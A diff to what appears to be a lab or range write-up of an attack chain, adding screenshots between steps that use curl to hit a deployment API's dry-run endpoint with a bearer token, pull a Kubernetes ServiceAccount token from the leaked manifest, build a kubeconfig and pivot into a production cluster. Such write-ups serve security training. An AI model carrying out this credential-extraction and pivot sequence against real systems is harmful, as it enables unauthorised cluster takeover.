@@ -19,6 +19,9 @@ curl -s http://11.x.x.x:8888/api/applications \
 ```
 Identifies `pul-ota-firmware` targeting `193.x.x.x:6443`.
 
+<img width="941" height="1012" alt="image" src="https://github.com/user-attachments/assets/2c88ac01-ed85-4132-bf91-ea75f8b38cd5" />
+
+
 ### Step 2 — Trigger Dry-run (THE VULNERABILITY)
 ```bash
 curl -s -X POST \
@@ -26,6 +29,9 @@ curl -s -X POST \
      -H "Authorization: Bearer dc-pul-deploy-2024-gridfall" | python3 -m json.tool
 ```
 Response contains the full resolved K8s YAML manifest.
+
+<img width="2001" height="672" alt="image" src="https://github.com/user-attachments/assets/0242ef5e-5984-4e13-b3ef-be80e5ccb546" />
+
 
 ### Step 3 — Extract ServiceAccount Token
 From the `manifest` field of the JSON response, find:
@@ -40,6 +46,13 @@ Also find the cluster endpoint in ConfigMap:
 ```yaml
 cluster_endpoint: "https://193.x.x.x:6443"
 ```
+
+<img width="1769" height="959" alt="image" src="https://github.com/user-attachments/assets/a87cbbd3-6a74-40b1-9ce5-0e13beb813ef" />
+
+<img width="1997" height="517" alt="image" src="https://github.com/user-attachments/assets/4dc426a5-a326-4c35-9f6d-d7ae6ff8296b" />
+
+
+
 
 ### Step 4 — Decode Token and Build Kubeconfig
 ```bash
@@ -69,6 +82,8 @@ EOF
 
 kubectl --kubeconfig /tmp/pul-k8s-prod.kubeconfig get namespaces
 ```
+<img width="1286" height="632" alt="image" src="https://github.com/user-attachments/assets/e906f2eb-b83d-4627-8d61-13573bac2195" />
+
 
 **PIVOT:** `193.x.x.x:6443` → RNG-CLD-01 Kubernetes cluster
 
